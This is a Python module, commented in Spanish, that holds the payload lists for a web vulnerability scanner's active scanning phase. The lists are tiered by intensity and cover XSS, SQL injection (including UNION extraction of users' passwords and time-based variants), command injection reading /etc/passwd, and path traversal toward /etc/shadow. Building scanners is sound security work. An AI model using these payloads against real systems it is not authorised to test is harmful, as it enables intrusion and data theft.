"""Base de payloads del Escáner Activo (Fase 2).

Las listas están pensadas para tres niveles de intensidad:

- ``low``: payloads básicos, rápidos y poco intrusivos;
- ``medium``: cobertura equilibrada (incluye boolean-based);
- ``high``: todas las variantes, time-based y bypasses de encoding.

Los payloads XSS usan ``{canary}`` para que la evidencia sea única y no se
confunda con scripts legítimos de la página.
"""

from __future__ import annotations

from typing import Literal

Intensity = Literal["low", "medium", "high"]

# --------------------------------------------------------------------- XSS

XSS_PAYLOADS: tuple[str, ...] = (
    "<script>alert('{canary}')</script>",
    "<script>alert(1)//{canary}</script>",
    "<svg/onload=alert('{canary}')>",
    "<svg onload=alert('{canary}')>",
    "<img src=x onerror=alert('{canary}')>",
    '<img src="x" onerror="alert(\'{canary}\')">',
    '"><svg/onload=alert(\'{canary}\')>',
    "'><svg/onload=alert('{canary}')>",
    '"><img src=x onerror=alert(\'{canary}\')>',
    "'><img src=x onerror=alert('{canary}')>",
    '" onmouseover=alert(\'{canary}\') x="',
    "' onmouseover=alert(\"{canary}\") x='",
    " onmouseover=alert('{canary}') x=",
    "javascript:alert('{canary}')",
    "javascript:alert(1)//{canary}",
    "\";alert('{canary}');//",
    "';alert('{canary}');//",
    "</script><svg/onload=alert('{canary}')>",
    "--><svg/onload=alert('{canary}')>",
    "<details open ontoggle=alert('{canary}')>",
    "<body onload=alert('{canary}')>",
    '<iframe srcdoc="<script>alert(\'{canary}\')</script>">',
    "<math><mtext></mtext><script>alert('{canary}')</script>",
    "<input autofocus onfocus=alert('{canary}')>",
    "<select autofocus onfocus=alert('{canary}')>",
    "<a href=\"javascript:alert('{canary}')\">x</a>",
)

BASIC_XSS_PAYLOADS: tuple[str, ...] = (
    "<script>alert('{canary}')</script>",
    "<svg/onload=alert('{canary}')>",
    "<img src=x onerror=alert('{canary}')>",
    '"><svg/onload=alert(\'{canary}\')>',
    "'><svg/onload=alert('{canary}')>",
    '" onmouseover=alert(\'{canary}\') x="',
    "javascript:alert('{canary}')",
    "\";alert('{canary}');//",
)

# ------------------------------------------------------------------- SQLi

SQLI_PAYLOADS: tuple[str, ...] = (
    "'",
    '"',
    "')",
    "' OR '1'='1'-- -",
    "' OR 1=1-- -",
    '" OR 1=1-- -',
    "' OR 1=2-- -",
    "' UNION SELECT NULL-- -",
    "' UNION SELECT NULL,NULL-- -",
    "' UNION SELECT username,password FROM users-- -",
    "' AND 1=1-- -",
    "' AND 1=2-- -",
    "admin'-- -",
    "' OR 1=1#",
    "'||(SELECT 1)||'",
)

BASIC_SQLI_PAYLOADS: tuple[str, ...] = (
    "'",
    '"',
    "')",
    "' OR 1=1-- -",
    "' OR '1'='1'-- -",
    "' UNION SELECT NULL-- -",
)

SQLI_TIME_PAYLOADS: tuple[str, ...] = (
    "'; WAITFOR DELAY '0:0:5'-- -",
    "' OR SLEEP(5)#",
    "' OR SLEEP(5)-- -",
    "' OR pg_sleep(5)-- -",
    "'; SELECT pg_sleep(5)-- -",
    # SQLite no tiene SLEEP: randomblob genera un blob grande y el motor
    # tarda varios segundos en materializarlo. 150 MB ≈ 6 s en HackLabs.
    "' OR randomblob(150000000)-- -",
)

# Pares (verdadero, falso) para blind SQLi boolean-based.
SQLI_BOOLEAN_PAIRS: tuple[tuple[str, str], ...] = (
    ("' AND 1=1-- -", "' AND 1=2-- -"),
    ('" AND 1=1-- -', '" AND 1=2-- -'),
    ("') AND 1=1-- -", "') AND 1=2-- -"),
    ("' AND '1'='1'-- -", "' AND '1'='2'-- -"),
    # La condición OR devuelve todas las filas cuando es verdadera: útil en
    # buscadores cuyo baseline no devuelve resultados.
    ("' OR 1=1-- -", "' OR 1=2-- -"),
    ('" OR 1=1-- -', '" OR 1=2-- -'),
)

# ------------------------------------------------------- Command Injection

COMMAND_PAYLOADS: tuple[str, ...] = (
    "; id",
    "| id",
    "|| id",
    "& id",
    "$(id)",
    "`id`",
    "; whoami",
    "| whoami",
    "; uname -a",
    "| uname -a",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
)

BASIC_COMMAND_PAYLOADS: tuple[str, ...] = (
    "; id",
    "| id",
    "$(id)",
    "`id`",
    "; whoami",
    "| whoami",
)

COMMAND_TIME_PAYLOADS: tuple[str, ...] = (
    "; sleep 5",
    "| sleep 5",
    "$(sleep 5)",
    "& ping -c 5 127.0.0.1",
    "& ping -n 6 127.0.0.1",
)

# ------------------------------------------------------- Path Traversal

TRAVERSAL_PAYLOADS: tuple[str, ...] = (
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc/passwd",
    "..%252f..%252f..%252f..%252fetc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
    "/etc/passwd",
    "../../../../../../../../etc/passwd%00.jpg",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....\\....\\....\\windows\\win.ini",
)

BASIC_TRAVERSAL_PAYLOADS: tuple[str, ...] = (
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "/etc/passwd",
)


def xss_templates(intensity: str, canary: str) -> tuple[str, ...]:
    """Payloads XSS genéricos para el nivel de intensidad."""

    if intensity == "low":
        templates: tuple[str, ...] = BASIC_XSS_PAYLOADS[:4]
    elif intensity == "medium":
        templates = BASIC_XSS_PAYLOADS
    else:
        templates = XSS_PAYLOADS
    return tuple(template.replace("{canary}", canary) for template in templates)


def sqli_payloads(intensity: str) -> tuple[str, ...]:
    if intensity == "low":
        return BASIC_SQLI_PAYLOADS
    if intensity == "medium":
        return SQLI_PAYLOADS[:10]
    return SQLI_PAYLOADS


def sqli_time_payloads(intensity: str) -> tuple[str, ...]:
    return SQLI_TIME_PAYLOADS if intensity in ("medium", "high") else ()


def sqli_boolean_pairs(intensity: str) -> tuple[tuple[str, str], ...]:
    if intensity == "low":
        return ()
    if intensity == "medium":
        # AND y OR: el segundo detecta buscadores cuyo baseline está vacío.
        return (SQLI_BOOLEAN_PAIRS[0], SQLI_BOOLEAN_PAIRS[1], *SQLI_BOOLEAN_PAIRS[-2:])
    return SQLI_BOOLEAN_PAIRS


def command_payloads(intensity: str) -> tuple[str, ...]:
    if intensity == "low":
        return BASIC_COMMAND_PAYLOADS
    if intensity == "medium":
        return COMMAND_PAYLOADS[:8]
    return COMMAND_PAYLOADS


def command_time_payloads(intensity: str) -> tuple[str, ...]:
    return COMMAND_TIME_PAYLOADS if intensity in ("medium", "high") else ()


def traversal_payloads(intensity: str) -> tuple[str, ...]:
    if intensity == "low":
        return BASIC_TRAVERSAL_PAYLOADS
    if intensity == "medium":
        return TRAVERSAL_PAYLOADS[:8]
    return TRAVERSAL_PAYLOADS
